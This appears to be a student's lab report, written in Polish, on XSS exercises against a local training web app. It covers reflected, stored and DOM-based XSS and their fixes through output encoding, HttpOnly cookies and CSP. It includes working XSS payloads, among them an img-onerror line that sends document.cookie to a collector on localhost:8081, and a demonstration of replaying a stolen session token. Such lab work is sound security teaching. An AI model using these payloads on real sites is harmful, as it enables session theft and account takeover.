## Zadanie 1

Adres z ładunkiem:

`/szukaj?q=<script>document.body.style.background='red';document.title='XSS-odbity'</script>`

Błąd w app.py w wierszu 37 to parametr q (zmienna fraza) doklejany do HTML bez kodowania. Poprawką jest `escape(fraza)`.

Fragment nagłówka odpowiedzi przed poprawką:

`Wyniki wyszukiwania dla: <script>document.title='XSS-odbity'</script>`

Po poprawce:

`Wyniki wyszukiwania dla: &lt;script&gt;document.title=&#x27;XSS-odbity&#x27;&lt;/script&gt;`

Wyszukiwanie q=konsultacje nadal znajduje ogłoszenie Anny.

Kodowanie wyjścia jest lepsze od usuwania słowa script, bo neutralizuje wszystkie znaki składni HTML niezależnie od ładunku, podczas gdy filtrowanie jednego słowa łatwo obejść innym zapisem lub innym znacznikiem.

## Zadanie 2

Ładunek dodany jako ogłoszenie:

`<img src="x" onerror="new Image().src='http://localhost:8081/?c='+encodeURIComponent(document.cookie)">`

Wpis zbieracza z sesją Anny (token skrócony): `ZEBRANO: /?c=session=eyJ1enl0...22AC8yxIySbgR0a`

Krok 3: żądanie z użyciem skradzionego tokenu zwróciło 200 OK i prywatną notatkę Anny (kod do szafki w pracowni 4721), bez znajomości hasła.

Nagłówki Set-Cookie z logowania (token skrócony):
- przed zmianą: `session=eyJ1enl0...IbjsRXcJ; Path=/`
- po zmianie: `session=eyJ1enl0...sSBdqF18; HttpOnly; Path=/`

Po ustawieniu HttpOnly i ponownym zalogowaniu skrypt nie zdołał już odczytać ciasteczka i w logu zbieracza nie przybył nowy wpis.

HttpOnly nie usuwa podatności XSS, bo skrypt nadal się wykonuje w kontekście strony ofiary i może działać w jej imieniu. Blokuje jedynie odczyt ciasteczka sesji przez JavaScript.

## Zadanie 3

Przywrócono kodowanie w tablica.html (usunięto filtr `|safe`). Stronę /podglad przerobiono z `innerHTML` na `textContent`, a skrypt przeniesiono do static/podglad.js.

| Ładunek | Przed naprawą | Po naprawie |
|---|---|---|
| odbity (/szukaj) | tło czerwone, tytuł XSS-odbity | ładunek jako tekst, bez efektu |
| zapisany (tablica) | wysłanie ciasteczka do zbieracza | ogłoszenie jako tekst, brak wpisu w zbieraczu |
| DOM (/podglad#) | tytuł karty XSS-DOM | ładunek jako tekst, tytuł bez zmian |

Nagłówek z odpowiedzi:

`Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'`

Test tekstu: ogłoszenie `Zażółć gęślą jaźń: <b>pogrubienie</b> & "cudzysłów" 'apostrof'` wyświetliło się dosłownie, jako `&lt;b&gt;pogrubienie&lt;/b&gt; &amp; &#34;cudzysłów&#34; &#39;apostrof&#39;`.

CSP jest dodatkową warstwą, a nie zamiennikiem kodowania wyjścia, bo działa dopiero w przeglądarce jako ostatnia linia obrony. Samo kodowanie wyjścia usuwa przyczynę podatności, a CSP ogranicza skutki, gdyby gdzieś zabrakło kodowania.
